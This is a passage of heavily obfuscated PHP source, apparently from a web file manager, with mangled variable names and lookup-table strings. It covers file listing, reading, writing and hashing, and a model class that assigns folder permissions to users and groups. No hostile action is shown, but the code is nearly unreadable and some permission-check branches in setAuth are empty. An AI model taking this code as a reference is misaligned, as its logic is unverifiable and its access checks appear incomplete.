$¯Í¼üÚ = $this->iconvSystem($¯Í¼üÚ); return @file_exists($¯Í¼üÚ); } public function isFile($­ÌîÙ¯Â) { $­ÌîÙ¯Â = $this->iconvSystem($­ÌîÙ¯Â); return @is_file($­ÌîÙ¯Â); } public function isFolder($©‘”ºº£) { $©‘”ºº£ = $this->iconvSystem($©‘”ºº£); return @is_dir($©‘”ºº£); } public function listPath($Şµ÷Äâ, $·éî¥·§ = false) { $¼å‡‡Ë‘ =& $_SERVER[èùÙ¹Ïö]; $Şµ÷Äâ = $this->iconvSystem($Şµ÷Äâ); $Şµ÷Äâ = rtrim($Şµ÷Äâ, $¼å‡‡Ë‘[8]) . $¼å‡‡Ë‘[8]; $Å‚¦Ñˆà = array($¼å‡‡Ë‘[84] => array(), $¼å‡‡Ë‘[85] => array()); if (!($ ÉÀˆ¡Ü = @opendir($Şµ÷Äâ))) { return $Å‚¦Ñˆà; } while (($¡£¹ÙÇ = readdir($ ÉÀˆ¡Ü)) !== !1) { if ($¡£¹ÙÇ == $¼å‡‡Ë‘[10] || $¡£¹ÙÇ == $¼å‡‡Ë‘[1326]) { continue; } $–ùö¯Ğç = $Şµ÷Äâ . $¡£¹ÙÇ; if (is_file($–ùö¯Ğç)) { $Å‚¦Ñˆà[$¼å‡‡Ë‘[85]][] = $this->fileInfo($–ùö¯Ğç, $·éî¥·§); } else { $Å‚¦Ñˆà[$¼å‡‡Ë‘[84]][] = $this->folderInfo($–ùö¯Ğç, $·éî¥·§); } } closedir($ ÉÀˆ¡Ü); return $Å‚¦Ñˆà; } public function listAll($Ş¤× Ìï, &$Ş°‰÷„õ = array()) { $·˜ÀøÏÖ =& $_SERVER[èùÙ¹Ïö]; $Ş¤× Ìï = $this->iconvSystem($Ş¤× Ìï); $Ş¤× Ìï = rtrim($Ş¤× Ìï, $·˜ÀøÏÖ[8]) . $·˜ÀøÏÖ[8]; if (!($¿¢œË…„ = @opendir($Ş¤× Ìï))) { return $Ş°‰÷„õ; } while (($ñ¾Ë³öá = readdir($¿¢œË…„)) !== !1) { if ($ñ¾Ë³öá == $·˜ÀøÏÖ[10] || $ñ¾Ë³öá == $·˜ÀøÏÖ[1326]) { continue; } $§ï×ÑËÁ = $Ş¤× Ìï . $ñ¾Ë³öá; $“äÏçÑ± = is_dir($§ï×ÑËÁ) && !is_link($§ï×ÑËÁ) ? 1 : 0; $§ï×ÑËÁ = $“äÏçÑ± ? $§ï×ÑËÁ . $·˜ÀøÏÖ[8] : $§ï×ÑËÁ; $Ş°‰÷„õ[] = array($·˜ÀøÏÖ[86] => $§ï×ÑËÁ, $·˜ÀøÏÖ[77] => $“äÏçÑ±, $·˜ÀøÏÖ[87] => intval(@filemtime($§ï×ÑËÁ)), $·˜ÀøÏÖ[78] => $“äÏçÑ± ? 0 : intval($this->size($§ï×ÑËÁ))); if ($“äÏçÑ±) { $this->listAll($§ï×ÑËÁ, $Ş°‰÷„õ); } } closedir($¿¢œË…„); return $Ş°‰÷„õ; } public function has($ğ‘£‘ü , $Û–õˆŠ = false, $¶Ã·»öÎ = true) { $Èûš„Ô† =& $_SERVER[èùÙ¹Ïö]; $ğ‘£‘ü  = $this->iconvSystem($ğ‘£‘ü ); $ğ‘£‘ü  = rtrim($ğ‘£‘ü , $Èûš„Ô†[8]) . $Èûš„Ô†[8]; if (!($ÊÙ¼£‘ = @opendir($ğ‘£‘ü ))) { return !1; } $–¹ˆ£ı¢ = 0; $áíÔÕæÚ = 0; $„ÛŠŸµ = 0; while (($Ë½—‹  = readdir($ÊÙ¼£‘)) !== !1) { if ($Ë½—‹  == $Èûš„Ô†[10] || $Ë½—‹  == $Èûš„Ô†[1326]) { continue; } $â²Æ³×Ÿ = $ğ‘£‘ü  . $Ë½—‹ ; if ($Û–õˆŠ) { $„ÛŠŸµ++; if (@is_file($â²Æ³×Ÿ)) { $–¹ˆ£ı¢++; } else { $áíÔÕæÚ++; } if ($„ÛŠŸµ > 10000) { break; } continue; } if ($¶Ã·»öÎ) { if (@is_file($â²Æ³×Ÿ)) { return !0; } } else { if (@is_dir($â²Æ³×Ÿ . $Èûš„Ô†[8])) { return !0; } } } closedir($ÊÙ¼£‘); if ($Û–õˆŠ) { return array($Èûš„Ô†[225] => $–¹ˆ£ı¢, $Èûš„Ô†[226] => $áíÔÕæÚ); } return !1; } public function hashSimple($×¥”êßí) { $çÕòşº =& $_SERVER[èùÙ¹Ïö]; if (!$×¥”êßí) { return md5($çÕòşº[12]); } $×¥”êßí = $this->iconvSystem($×¥”êßí); $š ˜¨øÖ = $this->size($×¥”êßí); $úÅüªë¿ = 200; $¯‘“Å·¢ = 50; if ($š ˜¨øÖ <= $úÅüªë¿ * $¯‘“Å·¢) { return $this->hashMd5($×¥”êßí) . $š ˜¨øÖ; } $º”Ìøí = $çÕòşº[12]; $ŠÑ©ÈË¡ = intval($š ˜¨øÖ / $¯‘“Å·¢); $”õÕü¤à = fopen($×¥”êßí, $çÕòşº[1415]); if (!$”õÕü¤à) { return $º”Ìøí; } for ($£ªëˆâ = 0; $£ªëˆâ < $¯‘“Å·¢; $£ªëˆâ++) { fseek_64($”õÕü¤à, $ŠÑ©ÈË¡ * $£ªëˆâ); $º”Ìøí .= fread($”õÕü¤à, $úÅüªë¿); } fseek_64($”õÕü¤à, $š ˜¨øÖ - $úÅüªë¿); $º”Ìøí .= fread($”õÕü¤à, $úÅüªë¿); fclose($”õÕü¤à); return md5($º”Ìøí) . $š ˜¨øÖ; } public function getContent($ùÇ´Àà) { $ùÇ´Àà = $this->iconvSystem($ùÇ´Àà); return file_get_contents($ùÇ´Àà); } public function setContent($’¨è‚’ª, $Ò®µœĞ = '') { $’¨è‚’ª = $this->iconvSystem($’¨è‚’ª); $ô¨×ê¼² = @file_put_contents($’¨è‚’ª, $Ò®µœĞ, LOCK_EX); clearstatcache(); @chmod($’¨è‚’ª, $this->pathAuth); return $ô¨×ê¼² === !1 ? !1 : !0; } public function fileSubstr($ŠÓšä«, $áÊÈş— = 0, $ôÁªœá÷ = false) { $Õ–ñ§éº =& $_SERVER[èùÙ¹Ïö]; $ŠÓšä« = $this->iconvSystem($ŠÓšä«); if ($ôÁªœá÷ === !1) { $ôÁªœá÷ = $this->size($ŠÓšä«); } if ($ôÁªœá÷ <= 0) { return $Õ–ñ§éº[12]; } $çÅí‰‰ƒ = fopen($ŠÓšä«, $Õ–ñ§éº[1415]); if (!$çÅí‰‰ƒ) { return !1; } fseek_64($çÅí‰‰ƒ, $áÊÈş—); $üĞ®æ‚± = fread($çÅí‰‰ƒ, $ôÁªœá÷); fclose($çÅí‰‰ƒ); return $üĞ®æ‚±; } public function upload($´µÄ©Ğ , $‹óÒ½ä—, $óşñêˆ = false, $ÚÆ±¾‘« = REPEAT_REPLACE) { if ($óşñêˆ) { return $this->moveFile($‹óÒ½ä—, $´µÄ©Ğ ); } return $this->copyFile($‹óÒ½ä—, $´µÄ©Ğ ); } public function setModifyTime($îÊ”ºİ¡, $³ÅŒĞä = '') { @touch($îÊ”ºİ¡, intval($³ÅŒĞä)); } public function download($ğ®¥ÁÔ, $ëºãŒÜ) { return $this->iconvSystem($ğ®¥ÁÔ); } } goto Eê¶¢ˆÑ³; aš¯ÉëÈ¦¿: class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\165\162\x63\x65\137\x61\x75\164\150"; public function getAuth($ı€¯ê²†) { $áò¸Š¦ş =& $_SERVER[èùÙ¹Ïö]; $¿ƒ˜•Ê— = $this->sourceAuthSelect($ı€¯ê²†); $Ë«ÑõÅ— = array(); $¤ÑÃğí = array(); $„¹¯ığ¢ = 2 << 25; foreach ($¿ƒ˜•Ê— as $ø¾„ËŞÏ) { $“ÌµÕ˜ = Model($áò¸Š¦ş[543])->listData($ø¾„ËŞÏ[$áò¸Š¦ş[1998]]); if (!$“ÌµÕ˜) { continue; } $Ë«ÑõÅ—[] = $ø¾„ËŞÏ; $…œÓ²Óº = 0; if ($ø¾„ËŞÏ[$áò¸Š¦ş[180]] == SourceModel::TYPE_GROUP) { $…œÓ²Óº = $„¹¯ığ¢ * 2; } if ($ø¾„ËŞÏ[$áò¸Š¦ş[180]] == SourceModel::TYPE_USER) { $…œÓ²Óº = $„¹¯ığ¢; } if ($ø¾„ËŞÏ[$áò¸Š¦ş[180]] == SourceModel::TYPE_USER && $ø¾„ËŞÏ[$áò¸Š¦ş[541]] == $áò¸Š¦ş[214]) { $…œÓ²Óº = 0; } $¤ÑÃğí[] = $“ÌµÕ˜[$áò¸Š¦ş[457]] + $…œÓ²Óº; } array_multisort($¤ÑÃğí, SORT_DESC, $Ë«ÑõÅ—); return $Ë«ÑõÅ—; } public function sourceAuthSelect($œÍŠ® ) { $°–ó“» =& $_SERVER[èùÙ¹Ïö]; static $™•ìè¬µ = array(); $§ŠÚÍ‰“ = is_array($œÍŠ® ) ? !1 : !0; if ($§ŠÚÍ‰“) { $œÍŠ®  = array($œÍŠ® ); } $®“­çÉ¤ = array(); foreach ($œÍŠ®  as $”µÜÒÓ­) { if (isset($™•ìè¬µ[$”µÜÒÓ­])) { $®“­çÉ¤[$”µÜÒÓ­] = $™•ìè¬µ[$”µÜÒÓ­]; } } if (count($®“­çÉ¤) == count($œÍŠ® )) { return $§ŠÚÍ‰“ ? $®“­çÉ¤[$œÍŠ® [0]] : $®“­çÉ¤; } $ äƒÃã = $°–ó“»[2076]; $ŒãæÙœø = array($°–ó“»[183] => array($°–ó“»[7], $œÍŠ® )); $’éÕÔŠ¸ = $this->field($ äƒÃã)->order($°–ó“»[445])->where($ŒãæÙœø)->select(); $ÊùÂĞ¢ = array_to_keyvalue_group($’éÕÔŠ¸, $°–ó“»[183]); foreach ($œÍŠ®  as $”µÜÒÓ­) { $™•ìè¬µ[$”µÜÒÓ­] = $ÊùÂĞ¢[$”µÜÒÓ­] ? $ÊùÂĞ¢[$”µÜÒÓ­] : array(); } if ($§ŠÚÍ‰“) { return $’éÕÔŠ¸; } return $ÊùÂĞ¢; } public function setAuth($ıü§øı, $ôùîÜ…î) { $ƒ®ÕĞ“ =& $_SERVER[èùÙ¹Ïö]; $±—÷ÌÚô = Model($ƒ®ÕĞ“[1381])->sourceInfo($ıü§øı); if (!$±—÷ÌÚô) { return !1; } if ($±—÷ÌÚô[$ƒ®ÕĞ“[180]] != SourceModel::TYPE_GROUP) { return !1; } $Ø›ãÀ´Ø = 1; $íÇŸœ£³ = $±—÷ÌÚô[$ƒ®ÕĞ“[541]]; if ($íÇŸœ£³ != $Ø›ãÀ´Ø) { $§ıùÕÄ¬ = array($ƒ®ÕĞ“[1894] => $íÇŸœ£³); $ŞŠãÜõæ = Model($ƒ®ÕĞ“[1984])->field($ƒ®ÕĞ“[1696])->where($§ıùÕÄ¬)->select(); $ŞŠãÜõæ = array_to_keyvalue($ŞŠãÜõæ, $ƒ®ÕĞ“[12], $ƒ®ÕĞ“[1696]); } $¹øçıó  = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $“·†°ĞÂ = array(); foreach ($ôùîÜ…î as $ÄÁí¹˜) { if (!in_array($ÄÁí¹˜[$ƒ®ÕĞ“[180]], $¹øçıó )) { show_json(LNG($ƒ®ÕĞ“[2077]), !1); } if ($íÇŸœ£³ != $Ø›ãÀ´Ø) { if ($ÄÁí¹˜[$ƒ®ÕĞ“[180]] == SourceModel::TYPE_GROUP) { } if ($ÄÁí¹˜[$ƒ®ÕĞ“[541]] != 0 && !in_array($ÄÁí¹˜[$ƒ®ÕĞ“[541]], $ŞŠãÜõæ)) { } } if ($ÄÁí¹˜[$ƒ®ÕĞ“[541]] == 0) { $ÄÁí¹˜[$ƒ®ÕĞ“[180]] = SourceModel::TYPE_USER; } $“·†°ĞÂ[] = array($ƒ®ÕĞ“[183] => $ıü§øı, $ƒ®ÕĞ“[180] => intval($ÄÁí¹˜[$ƒ®ÕĞ“[180]]), $ƒ®ÕĞ“[541] => intval($ÄÁí¹˜[$ƒ®ÕĞ“[541]]), $ƒ®ÕĞ“[1998] => intval($ÄÁí¹˜[$ƒ®ÕĞ“[1998]]) ? intval($ÄÁí¹˜[$ƒ®ÕĞ“[1998]]) : 0, $ƒ®ÕĞ“[2059] => intval($ÄÁí¹˜[$ƒ®ÕĞ“[2059]]) ? intval($ÄÁí¹˜[$ƒ®ÕĞ“[2059]]) : -1); } $this->where(array($ƒ®ÕĞ“[461] => $ıü§øı))->delete(); $this->addAll($“·†°ĞÂ); return !0; } public function authClear($Ø½Ú²Ë) { $É„ø˜‰ =& $_SERVER[èùÙ¹Ïö]; $ıÙ“†¤¬ = Model($É„ø˜‰[1381])->sourceInfo($Ø½Ú²Ë); $Õ¡Ğ‰Õ‡ = array($Ø½Ú²Ë); if ($ıÙ“†¤¬[$É„ø˜‰[455]] == $É„ø˜‰[90]) { $Ä¾ú’ = array($É„ø˜‰[623] => array($É„ø˜‰[583], $ıÙ“†¤¬[$É„ø˜‰[556]] . $Ø½Ú²Ë . $É„ø˜‰[584])); $Õ¡Ğ‰Õ‡ = Model($É„ø˜‰[1381])->field($É„ø˜‰[461])->where($Ä¾ú’)->getField($É„ø˜‰[183], !0); $Õ¡Ğ‰Õ‡[] = $Ø½Ú²Ë; } $this->where(array($É„ø˜‰[461] => array($É„ø˜‰[462], $Õ¡Ğ‰Õ‡)))->delete(); return !0; } public function getAllChildren($Ùè˜Ó¯¤) { $ŠÙ’ô Œ =& $_SERVER[èùÙ¹Ïö]; $ß’éĞÕÕ = Model($ŠÙ’ô Œ[1381])->sourceInfo($Ùè˜Ó¯¤); if ($ß’éĞÕÕ[$ŠÙ’ô Œ[455]] != $ŠÙ’ô Œ[90]) { return $this->sourceListAuth(array($Ùè˜Ó¯¤)); } if ($ß’éĞÕÕ[$ŠÙ’ô Œ[180]] != SourceModel::TYPE_GROUP) { return array(); } $ü…ğííĞ = 1; $³Èäœƒü = array($Ùè˜Ó¯¤); if ($ß’éĞÕÕ[$ŠÙ’ô Œ[182]] == $ŠÙ’ô Œ[214] && $ß’éĞÕÕ[$ŠÙ’ô Œ[541]] != $ü…ğííĞ) { $³Èäœƒü = $this->groupChidldAllRootSource($ß’éĞÕÕ[$ŠÙ’ô Œ[541]]); } $•î—Ù¶Ÿ = $this->field($ŠÙ’ô Œ[183])->group($ŠÙ’ô Œ[183])->select(); $•î—Ù¶Ÿ = array_to_keyvalue($•î—Ù¶Ÿ, $ŠÙ’ô Œ[12], $ŠÙ’ô Œ[183]); if (!$•î—Ù¶Ÿ) { return array(); } $¢ò°Ö¹„ = $ŠÙ’ô Œ[2078]; $®³›ÕÂ§ = array($ŠÙ’ô Œ[183] => array($ŠÙ’ô Œ[7], $•î—Ù¶Ÿ), $ŠÙ’ô Œ[475] => $ŠÙ’ô Œ[214]); $‡—–éÀ’ = Model($ŠÙ’ô Œ[865])->field($¢ò°Ö¹„)->where($®³›ÕÂ§)->select(); $É„öóˆá = array($Ùè˜Ó¯¤); foreach ($‡—–éÀ’ as $ª¢åÄê) { foreach ($³Èäœƒü as $áÚ¿Í‰) { $Ä­õÙõ¯ = $ŠÙ’ô Œ[50] . $áÚ¿Í‰ . $ŠÙ’ô Œ[50]; $´²·÷©Ã = $ª¢åÄê[$ŠÙ’ô Œ[556]] . $ª¢åÄê[$ŠÙ’ô Œ[183]] . $ŠÙ’ô Œ[50]; if (strstr($´²·÷©Ã, $Ä­õÙõ¯)) { $É„öóˆá[] = $ª¢åÄê[$ŠÙ’ô Œ[183]]; break; } } } return $this->sourceListAuth($É„öóˆá); } private function sourceListAuth($ãƒ¬Ó) { $„¾É­ =& $_SERVER[èùÙ¹Ïö]; $æì«½»Õ = Model($„¾É­[1381])->sourceListInfo($ãƒ¬Ó, !0); $åæôâÑ• = $this->sourceAuthSelect($ãƒ¬Ó); $ıçÃ’Éß = array(); $¨˜¯äúÏ = array(); foreach ($æì«½»Õ as $ğñê¬Õõ) { unset($ğñê¬Õõ[$„¾É­[499]]); unset($ğñê¬Õõ[$„¾É­[497]]); unset($ğñê¬Õõ[$„¾É­[457]]); unset($ğñê¬Õõ[$„¾É­[89]]); $ŒíæäÙş = $åæôâÑ•[$ğñê¬Õõ[$„¾É­[183]]]; if (!$ŒíæäÙş) { continue; } $ğñê¬Õõ[$„¾É­[2079]] = $this->authTargetInfo($ŒíæäÙş); $ğñê¬Õõ[$„¾É­[554]] = rtrim($ğñê¬Õõ[$„¾É­[560]], $„¾É­[8]) . $„¾É­[8] . ltrim($ğñê¬Õõ[$„¾É­[554]], $„¾É­[8]); $ıçÃ’Éß[] = $ğñê¬Õõ; $ƒáá—ĞÍ = count(explode($„¾É­[8], trim($ğñê¬Õõ[$„¾É­[554]], $„¾É­[8]))); $¨˜¯äúÏ[] = $ƒáá—ĞÍ + ($ğñê¬Õõ[$„¾É­[33]] == $„¾É­[77] ? 0 : 1000); } array_multisort($¨˜¯äúÏ, SORT_ASC, $ıçÃ’Éß); return $ıçÃ’Éß; } private function groupChidldAllRootSource($¯³ê³ë§) { $·üØ‚¤ =& $_SERVER[èùÙ¹Ïö]; $¡ÍúèÜ³ = Model($·üØ‚¤[2080])->groupChildrenAll($¯³ê³ë§); $Ö™½Ø—ç = array($·üØ‚¤[182] => 0, $·üØ‚¤[541] => array($·üØ‚¤[7], $¡ÍúèÜ³), $·üØ‚¤[180] => SourceModel::TYPE_GROUP); $Èä¬¦âğ = Model($·üØ‚¤[865])->field($·üØ‚¤[183])->where($Ö™½Ø—ç)->select(); $Èä¬¦âğ = array_to_keyvalue($Èä¬¦âğ, $·üØ‚¤[12], $·üØ‚¤[183]); return $Èä¬¦âğ; } private function authTargetInfo($ŸÙŒÈòù) { $‹¶×Í½Ô =& $_SERVER[èùÙ¹Ïö]; $íÊ¶½€¹ = array(); $ŒĞĞ¡¹ = array(); $ÇÕ£˜µé = 2 << 25; foreach ($ŸÙŒÈòù as $²ÚœÚÌ») { $Å°—®Á = Model($‹¶×Í½Ô[543])->listData($²ÚœÚÌ»[$‹¶×Í½Ô[1998]]); if (!$Å°—®Á) { continue; } if ($²ÚœÚÌ»[$‹¶×Í½Ô[180]] == SourceModel::TYPE_USER) { $‘ºœ™ò = Model($‹¶×Í½Ô[549])->getInfoSimpleOuter($²ÚœÚÌ»[$‹¶×Í½Ô[541]]); if ($‘ºœ™ò[$‹¶×Í½Ô[1696]] == $‹¶×Í½Ô[1236]) { continue; } if ($‘ºœ™ò[$‹¶×Í½Ô[1696]] == $‹¶×Í½Ô[214]) { $‘ºœ™ò[$‹¶×Í½Ô[32]] = LNG($‹¶×Í½Ô[2081]); } } else { $‘ºœ™ò = Model($‹¶×Í½Ô[557])->getInfoSimple($²ÚœÚÌ»[$‹¶×Í½Ô[541]]); } if (!$‘ºœ™ò) { continue; } $‘ºœ™ò[$‹¶×Í½Ô[510]] = $Å°—®Á; $íÊ¶½€¹[] = $‘ºœ™ò; $˜™ŒµÏ = 0; if ($²ÚœÚÌ»[$‹¶×Í½Ô[180]] == SourceModel::TYPE_GROUP) { $˜™ŒµÏ = $ÇÕ£˜µé * 2; } if ($²ÚœÚÌ»[$‹¶×Í½Ô[180]] == SourceModel::TYPE_USER) { $˜™ŒµÏ = $ÇÕ£˜µé; } if ($²ÚœÚÌ»[$‹¶×Í½Ô[180]] == SourceModel::TYPE_USER && $²ÚœÚÌ»[$‹¶×Í½Ô[541]] == $‹¶×Í½Ô[214]) { $˜™ŒµÏ = 0; } $ŒĞĞ¡¹[] = $Å°—®Á[$‹¶×Í½Ô[457]] + $˜™ŒµÏ; } array_multisort($ŒĞĞ¡¹, SORT_DESC, $íÊ¶½€¹); return $íÊ¶½€¹; } public function getAllChildrenByUser($‹Ô’š„, $úÄèÀ°) { $½‰ƒáò =& $_SERVER[èùÙ¹Ïö]; $Ş®ûŞƒ‰ = Model($½‰ƒáò[570])->getInfo($úÄèÀ°); if (!$úÄèÀ° || !$‹Ô’š„ || !$Ş®ûŞƒ‰) { return array(); } $ŒÇ†¯µŒ = Model($½‰ƒáò[1381])->sourceInfo($‹Ô’š„); $§ëƒü¹Í = array(); $şÚËÒÏº = 1; if ($ŒÇ†¯µŒ[$½‰ƒáò[182]] == $½‰ƒáò[214] && $ŒÇ†¯µŒ[$½‰ƒáò[541]] != $şÚËÒÏº && $this->groupContainUser($ŒÇ†¯µŒ[$½‰ƒáò[541]], $úÄèÀ°)) { foreach ($Ş®ûŞƒ‰[$½‰ƒáò[2082]] as $²©ªº) { $„£‚‰ô = Model($½‰ƒáò[557])->getInfo($²©ªº[$½‰ƒáò[1894]]); $­ÊÎ¨§ß = Model($½‰ƒáò[570])->getInfoSimpleOuter($úÄèÀ°); $­ÊÎ¨§ß[$½‰ƒáò[510]] = $²©ªº[$½‰ƒáò[457]]; if (Model($½‰ƒáò[543])->authCheckAction($²©ªº[$½‰ƒáò[457]][$½‰ƒáò[457]], $½‰ƒáò[1915])) { continue; } $ô¹“…Ğ÷ = array($½‰ƒáò[32] => $½‰ƒáò[1256] . $„£‚‰ô[$½‰ƒáò[32]], $½‰ƒáò[183] => $„£‚‰ô[$½‰ƒáò[89]][$½‰ƒáò[183]], $½‰ƒáò[86] => KodIO::make($„£‚‰ô[$½‰ƒáò[89]][$½‰ƒáò[183]]), $½‰ƒáò[182] => $½‰ƒáò[214], $½‰ƒáò[180] => $½‰ƒáò[550], $½‰ƒáò[33] => $½‰ƒáò[587], $½‰ƒáò[554] => $„£‚‰ô[$½‰ƒáò[561]], $½‰ƒáò[1894] => $„£‚‰ô[$½‰ƒáò[1894]], $½‰ƒáò[558] => $„£‚‰ô[$½‰ƒáò[182]], $½‰ƒáò[2079] => array($­ÊÎ¨§ß)); $§ëƒü¹Í[$ô¹“…Ğ÷[$½‰ƒáò[183]]] = $ô¹“…Ğ÷; } } $µğºª¼ = array(); $Ç‚·ˆ¸» = $this->getAllChildren($‹Ô’š„); foreach ($Ç‚·ˆ¸» as $ÁŠ¶Åó) { $èÌ­°¯Ù = !1; foreach ($ÁŠ¶Åó[$½‰ƒáò[2079]] as $­‹¸±Íİ) { if ($­‹¸±Íİ[$½‰ƒáò[1696]]) { if ($­‹¸±Íİ[$½‰ƒáò[1696]] == $úÄèÀ°) { $èÌ­°¯Ù = !0; break; } } if ($­‹¸±Íİ[$½‰ƒáò[1894]]) { if ($this->groupContainUser($­‹¸±Íİ[$½‰ƒáò[1894]], $úÄèÀ°)) { $èÌ­°¯Ù = !0; break; } } } if ($èÌ­°¯Ù) { $µğºª¼[] = $ÁŠ¶Åó; } $›æÖé€ˆ = $ÁŠ¶Åó[$½‰ƒáò[183]]; if (isset($§ëƒü¹Í[$›æÖé€ˆ])) { $ÁŠ¶Åó[$½‰ƒáò[2079]][] = $§ëƒü¹Í[$›æÖé€ˆ][0]; $§ëƒü¹Í[$›æÖé€ˆ] = !1; } } $§ëƒü¹Í = array_filter(array_values($§ëƒü¹Í)); $µğºª¼ = array_merge($§ëƒü¹Í, $µğºª¼); return $µğºª¼; } public function setAllChildrenByUser($áäæôÖ´, $½•Õïè, $¼Õ—ä¨) { $İïÚú÷À =& $_SERVER[èùÙ¹Ïö]; $¼øÙõ°º = $this->getAllChildrenByUser($áäæôÖ´, $½•Õïè); if (!$¼Õ—ä¨ || !$¼øÙõ°º) { return !1; } foreach ($¼øÙõ°º as $˜£¢‰û) { $å©Ì¹ÓÚ = array(); foreach ($˜£¢‰û[$İïÚú÷À[2079]] as $µıƒòõ®) { $Á†šêÇ¦ = $µıƒòõ®[$İïÚú÷À[510]]; $¶Âì¸£Ò = $µıƒòõ®[$İïÚú÷À[1696]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $î¢Ûó©² = $µıƒòõ®[$İïÚú÷À[1696]] ? $µıƒòõ®[$İïÚú÷À[1696]] : $µıƒòõ®[$İïÚú÷À[1894]]; if ($µıƒòõ®[$İïÚú÷À[1696]] && $µıƒòõ®[$İïÚú÷À[1696]] == $½•Õïè) { continue; } $å©Ì¹ÓÚ[] = array($İïÚú÷À[183] => $˜£¢‰û[$İïÚú÷À[183]], $İïÚú÷À[180] => $¶Âì¸£Ò, $İïÚú÷À[541] => intval($î¢Ûó©²), $İïÚú÷À[1998] => isset($Á†šêÇ¦[$İïÚú÷À[445]]) ? intval($Á†šêÇ¦[$İïÚú÷À[445]]) : 0, $İïÚú÷À[2059] => isset($Á†šêÇ¦[$İïÚú÷À[2059]]) ? intval($Á†šêÇ¦[$İïÚú÷À[2059]]) : -1); } $å©Ì¹ÓÚ[] = array($İïÚú÷À[183] => $˜£¢‰û[$İïÚú÷À[183]], $İïÚú÷À[180] => SourceModel::TYPE_USER, $İïÚú÷À[541] => intval($½•Õïè), $İïÚú÷À[1998] => intval($¼Õ—ä¨), $İïÚú÷À[2059] => -1); $this->where(array($İïÚú÷À[461] => $˜£¢‰û[$İïÚú÷À[183]]))->delete(); $this->addAll($å©Ì¹ÓÚ); } return !0; } public function get($íÑ­»«¯) { $¤ê˜îêó = $this->getSourceList(array($íÑ­»«¯), !0); return $¤ê˜îêó[0]; } public function getSourceList($¶²ı—“ù, $ùÒÚåÂ´ = false, $Ê¡‘İô = false) { $ûÁ·ôÃÚ =& $_SERVER[èùÙ¹Ïö]; if (!$¶²ı—“ù) { return array(); } $‚ÄÙ÷á = Model($ûÁ·ôÃÚ[1381]); if (!$ùÒÚåÂ´ && count($¶²ı—“ù) == 1) { $ùÒÚåÂ´ = array(); $ùÒÚåÂ´[$¶²ı—“ù[0]] = $‚ÄÙ÷á->sourceInfo($¶²ı—“ù[0]); } if (!$ùÒÚåÂ´) { $¹ÙÃÖ¬ñ = array($ûÁ·ôÃÚ[461] => array($ûÁ·ôÃÚ[462], $¶²ı—“ù)); $ùÒÚåÂ´ = $‚ÄÙ÷á->field($ûÁ·ôÃÚ[2083])->where($¹ÙÃÖ¬ñ)->select(); $ùÒÚåÂ´ = array_to_keyvalue($ùÒÚåÂ´, $ûÁ·ôÃÚ[183]); } $ğÜíğÈş = $¶²ı—“ù; foreach ($ùÒÚåÂ´ as $ëÂöÍÈ— => $œ™¼äå€) { $ß’ñÎ¯Œ = $‚ÄÙ÷á->parentLevelArray($œ™¼äå€[$ûÁ·ôÃÚ[556]]); $ğÜíğÈş = array_merge($ğÜíğÈş, array($ëÂöÍÈ—), array_reverse($ß’ñÎ¯Œ)); } $ğÜíğÈş = array_values(array_unique($ğÜíğÈş)); if (!$ğÜíğÈş) { return array(); } $×’ïîËì = $this->sourceAuthSelect($ğÜíğÈş); $ãïöííç = array(); foreach ($ğÜíğÈş as $°ÚÆ³Á’) { if (isset($×’ïîËì[$°ÚÆ³Á’])) { $ãïöííç[$°ÚÆ³Á’] = $×’ïîËì[$°ÚÆ³Á’]; } } $õ•ãÁ¤¤ = $this->userIsRoot($Ê¡‘İô); $øàÍĞ¾† = AuthModel::authAll(); $‡£ÑŸ¦Ì = array($ûÁ·ôÃÚ[458] => $øàÍĞ¾†, $ûÁ·ôÃÚ[2084] => array($ûÁ·ôÃÚ[463] => 0, $ûÁ·ôÃÚ[1900] => $øàÍĞ¾†, $ûÁ·ôÃÚ[464] => LNG($ûÁ·ôÃÚ[2085]), $ûÁ·ôÃÚ[1917] => $ûÁ·ôÃÚ[2086])); $£òÀÏøÁ = array(); foreach ($ùÒÚåÂ´ as $°ÚÆ³Á’ => $°ó˜»Äë) { if ($õ•ãÁ¤¤ && $GLOBALS[$ûÁ·ôÃÚ[6]][$ûÁ·ôÃÚ[1913]]) { $£òÀÏøÁ[$°ÚÆ³Á’] = $‡£ÑŸ¦Ì; continue; } $£òÀÏøÁ[$°ÚÆ³Á’] = $this->makeSourceAuth($°ó˜»Äë, $ãïöííç, $Ê¡‘İô); } return $£òÀÏøÁ; } public function authDeepCheck($ ±®³óä, $ÅéÔ¤ = false) { $ÓôˆÑÑ‡ =& $_SERVER[èùÙ¹Ïö]; $ÅéÔ¤ = $ÅéÔ¤ ? $ÅéÔ¤ : USER_ID; $Â±›­Å = $this->makeAuthDeep($ÅéÔ¤); if (!in_array($ ±®³óä, $Â±›­Å[$ÓôˆÑÑ‡[2087]])) { return !1; } $ĞŞì·µµ = array(); foreach ($Â±›­Å[$ÓôˆÑÑ‡[2088]] as $é¾ú¹¼ => $Öİ¹—) { if (!in_array($ ±®³óä, $Öİ¹—)) { continue; } $ĞŞì·µµ[] = $é¾ú¹¼; } if (!$ĞŞì·µµ) { return !1; } $àøÁ¹’ = $ĞŞì·µµ ? $ĞŞì·µµ[0] : $ ±®³óä; return array($ÓôˆÑÑ‡[458] => -1, $ÓôˆÑÑ‡[510] => array($ÓôˆÑÑ‡[463] => $ÓôˆÑÑ‡[1236], $ÓôˆÑÑ‡[1900] => $ÓôˆÑÑ‡[214], $ÓôˆÑÑ‡[464] => LNG($ÓôˆÑÑ‡[2089]), $ÓôˆÑÑ‡[1917] => $ÓôˆÑÑ‡[2090]), $ÓôˆÑÑ‡[2091] => LNG($ÓôˆÑÑ‡[2092]), $ÓôˆÑÑ‡[2093] => $this->sourceAuthInfo($àøÁ¹’)); } protected function makeAuthDeep($ŸéèÇ›È = false) { $çÖÎ™ßİ =& $_SERVER[èùÙ¹Ïö]; static $ÏòÅ–‹± = array(); $ŸéèÇ›È = $ŸéèÇ›È ? $ŸéèÇ›È : USER_ID; if (isset($ÏòÅ–‹±[$ŸéèÇ›È])) { return $ÏòÅ–‹±[$ŸéèÇ›È]; } $ÒöòõÃ = Model($çÖÎ™ßİ[2094])->listData(); $¢®ëÖÈŸ = array(); foreach ($ÒöòõÃ as $©‹ØÓ¬ş) { if ($©‹ØÓ¬ş[$çÖÎ™ßİ[457]] == 0 && $©‹ØÓ¬ş[$çÖÎ™ßİ[1916]] == $çÖÎ™ßİ[90]) { $¢®ëÖÈŸ[] = 